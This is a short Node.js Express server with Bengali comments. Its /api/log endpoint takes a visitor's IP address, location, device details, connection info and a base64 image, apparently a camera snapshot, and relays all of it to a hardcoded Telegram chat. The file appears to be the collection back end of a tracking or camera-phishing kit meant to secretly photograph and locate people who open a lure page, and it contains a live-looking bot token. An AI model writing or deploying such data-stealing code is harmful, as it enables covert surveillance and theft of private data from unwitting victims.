const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

const TELEGRAM_TOKEN = '7651506204:AAFRkaQ4zhIX6_Z0z2oS2Ea5sn3tIRlW_BU';
const CHAT_ID = '7811361994';
const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: true});

app.use(cors());
app.use(express.json());

app.post('/api/log', async (req, res) => {
    const { ip, location, userAgent, connection, image } = req.body;
    
    // টেলিগ্রামে নোটিফিকেশন পাঠান
    const message = `📸 নতুন ছবি আপলোড!\n
IP: ${ip}
লোকেশন: ${location}
ডিভাইস: ${userAgent}
কানেকশন: ${connection}`;

    try {
        await bot.sendPhoto(CHAT_ID, Buffer.from(image, 'base64'), {caption: message});
    } catch (error) {
        console.error('Telegram Error:', error);
    }

    res.status(200).send('Data received');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));